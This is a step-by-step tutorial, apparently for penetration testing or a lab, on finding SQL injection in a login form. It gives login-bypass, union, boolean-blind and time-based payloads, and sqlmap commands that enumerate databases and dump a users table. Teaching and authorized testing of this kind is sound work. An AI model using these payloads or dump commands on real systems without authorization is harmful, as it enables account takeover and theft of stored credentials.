# SQL-Injection

Let's dive deeply into SQL Injection testing on the login page of your target application. Here’s how to conduct it step-by-step, with detailed explanations for each part. SQL Injection is a technique used to exploit vulnerabilities in applications that improperly sanitize or validate user inputs, allowing attackers to execute arbitrary SQL queries on the database.

### **Step 1: Understand the Login Form Structure**

1. **Open the Login Page**: Navigate to the login page at for example `http://10.116.58.10`.
   - Observe the fields: Typically, a login form has fields like **username** and **password**.
   - Identify form submission methods: Right-click on the login page, inspect it with Developer Tools, and note the form’s method (usually POST) and URL path (e.g., `/login`).

2. **Inspect HTTP Request**: Use **Browser DevTools** (Network tab) to observe the HTTP request sent when logging in.
   - Enter any credentials (e.g., username: `test`, password: `test`) and hit submit.
   - Inspect the request payload to see how data is sent. This helps us understand how SQL Injection payloads should be crafted.

### **Step 2: Basic SQL Injection Testing**

**2.1 Manual Testing with Common Payloads**
1. **Identify Vulnerable Parameters**: Start by testing the username field to see if it’s vulnerable to SQL Injection.
   - Enter the following in the username field: `' OR '1'='1`
   - Leave the password field blank or with any random string.
   - Click login and observe the behavior.

   **Expected Result**: If the form is vulnerable, this payload might allow you to bypass the login if the application improperly processes this input in SQL. The `OR '1'='1` portion always evaluates to true, potentially granting access.

2. **Common SQL Injection Payloads**:
   - Here are a few variations to try in the username field to identify the vulnerability:
     - `' OR '1'='1' -- `
     - `admin' -- `
     - `admin' #`
     - `admin' OR '1'='1`

   - After entering each payload, observe if the application grants access or produces an error message. These responses often indicate whether the application is vulnerable to SQL Injection.

**Example**:
   - **Payload**: `' OR '1'='1' -- `
   - **Outcome**: Successful login without a password or an error message that reveals the backend SQL structure.

### **Step 3: Observing Error Messages**

Error messages can provide valuable clues about SQL Injection vulnerabilities. If any payload results in an error like `Syntax error in SQL statement`, `Unclosed quotation mark after the character string`, or similar, it could indicate a vulnerability.

1. **Testing Error-Based SQL Injection**:
   - Enter a payload designed to cause an SQL syntax error, such as:
     - `admin' OR 1=1-- -`
   - **Expected Outcome**: If error messages appear, they can reveal the database structure and help you craft more advanced payloads.

### **Step 4: Automated SQL Injection Testing with SQLmap**

SQLmap is a powerful tool for automating SQL Injection detection and exploitation. Let’s use it to verify if SQL Injection is possible and retrieve data from the database.

1. **Identify the Form Action URL and Method**: From the previous inspection, note down the form’s URL (e.g., `/login`) and whether it uses POST or GET for data submission.

2. **Run SQLmap**:
   - If the form uses POST, use a command like:
     ```bash
     sqlmap -u "http://10.116.58.10/login" --data="username=admin&password=test" --dbs
     ```
   - This command tells SQLmap to test the login URL, with `username` and `password` as form data.

   **Explanation**:
   - `-u`: Specifies the target URL.
   - `--data`: Provides the POST data parameters and values.
   - `--dbs`: Tells SQLmap to enumerate available databases if a vulnerability is found.

3. **Analyze SQLmap Output**:
   - If the page is vulnerable, SQLmap will output something like:
     ```
     [INFO] Parameter 'username' appears to be injectable
     ```
   - SQLmap will also list the databases found on the server if it can exploit the vulnerability.

4. **Retrieve Information**:
   - Once SQLmap identifies a vulnerable parameter, you can extract further data. For example:
     - To list tables in a specific database:
       ```bash
       sqlmap -u "http://10.116.58.10/login" --data="username=admin&password=test" -D target_db --tables
       ```
     - Replace `target_db` with the actual database name found in the previous step.

     - To extract data from a table (e.g., `users`):
       ```bash
       sqlmap -u "http://10.116.58.10/login" --data="username=admin&password=test" -D target_db -T users --dump
       ```

**Example Output**:
   ```
   Database: target_db
   Table: users
   +----+----------+----------+
   | id | username | password |
   +----+----------+----------+
   | 1  | admin    | admin123 |
   | 2  | guest    | guest123 |
   ```

---

### **Step 5: Advanced SQL Injection Techniques**

Once basic SQL Injection is confirmed, advanced techniques can be applied:

1. **Union-Based SQL Injection**:
   - If the application is vulnerable, UNION-based SQL Injection can help extract data.
   - Example payload for union-based injection:
     ```
     admin' UNION SELECT null, version()-- 
     ```
   - **Expected Outcome**: This payload can reveal the database version, helpful for tailoring further attacks.

2. **Boolean-Based Blind SQL Injection**:
   - For applications that don’t display error messages, Boolean-based SQL Injection can help verify conditions.
   - Try payloads like:
     ```
     admin' AND 1=1 -- (should return true and grant access)
     admin' AND 1=2 -- (should return false and deny access)
     ```

3. **Time-Based Blind SQL Injection**:
   - If no visible response is shown, time-based injections can determine if SQL queries are executed.
   - Example payload:
     ```
     admin' OR IF(1=1, SLEEP(5), 0)-- 
     ```
   - **Expected Outcome**: If the application delays the response by 5 seconds, the injection is working.

### **Step 6: Document Findings and Report**

After performing these tests:
1. **Document Each Payload and Result**: Describe each injection attempt, payload used, and the application's response.
2. **Provide Screenshots (If Possible)**: Take screenshots showing the injected payload and application response for evidence.
3. **Summarize Vulnerabilities**: Conclude with specific recommendations, such as using prepared statements or parameterized queries, to mitigate SQL Injection risks.

---

### **Sample SQL Injection Checklist**

- **Basic Input Testing**: Check if special characters trigger errors.
- **Error-Based SQL Injection**: Test payloads to identify database errors.
- **SQLmap Testing**: Automate checks with SQLmap for all parameters.
- **Union-Based Injection**: Use UNION to combine query results.
- **Boolean and Time-Based Blind SQL**: For sites that don’t display errors.
- **Report and Document**: Detail all findings with evidence.
